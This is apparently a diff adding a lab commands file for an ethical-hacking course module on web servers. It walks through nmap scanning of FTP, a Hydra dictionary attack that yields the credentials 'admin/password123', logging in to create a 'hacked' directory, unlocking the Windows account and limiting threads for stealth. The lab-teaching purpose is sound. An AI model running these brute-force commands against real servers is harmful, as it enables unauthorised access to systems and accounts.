@@ -1,0 +1,80 @@
+
+```
+# Module 13 – Hacking Web Servers: Commands File  
+**Lab: FTP Credential Cracking & Exploitation**  
+
+---
+
+## 🔍 **Network Scanning**  
+### Scan for Open FTP Port  
+```bash
+nmap -p 21 -sV 10.1.164.60  
+```  
+**Purpose:**  
+- Scans port 21 on the target IP (`10.1.164.60`) to verify if FTP is running.  
+**Example Output:**  
+```  
+21/tcp open  ftp Microsoft ftpd  
+```  
+
+---
+
+## 🔓 **FTP Credential Cracking**  
+### Launch Dictionary Attack with Hydra  
+```bash
+hydra -L /path/to/Usernames.txt -P /path/to/Passwords.txt ftp://10.1.164.60  
+```  
+**Flags Explained:**  
+- `-L`: Path to username wordlist.  
+- `-P`: Path to password wordlist.  
+- `ftp://`: Target protocol and IP.  
+
+**Successful Output:**  
+```  
+[21][ftp] host: 10.1.164.60   login: admin   password: password123  
+```  
+
+---
+
+## 📂 **FTP Access & File Manipulation**  
+### Connect to FTP Server  
+```bash
+ftp 10.1.164.60  
+```  
+**Post-Connection Commands:**  
+```  
+Username: admin  
+Password: password123  
+ls                 # List directory contents  
+mkdir hacked       # Create "hacked" directory  
+exit               # Terminate FTP session  
+```  
+
+---
+
+## 🛠️ **Troubleshooting Commands**  
+### Fix Hydra Syntax Errors  
+```bash
+hydra -L Usernames.txt -P Passwords.txt ftp://10.1.164.60  # Correct spacing  
+```  
+
+### Resolve Wordlist Permission Issues  
+```bash
+chmod 644 Usernames.txt Passwords.txt  # Grant read access  
+```  
+
+### Unlock Locked FTP Accounts  
+```bash
+net user admin /active:yes  # Reset account lockout on Windows target  
+```  
+
+---
+
+## 💡 **Notes**  
+- Replace `/path/to/` with actual wordlist locations (e.g., `/home/parrot/Desktop/Wordlists/`).  
+- For stealth, use `-t 4` in Hydra to limit parallel connections (e.g., `hydra -t 4 ...`).  
+
+---
+
+📂 **File saved as:** [`commands_module13.md`](commands_module13.md)  
+``` 
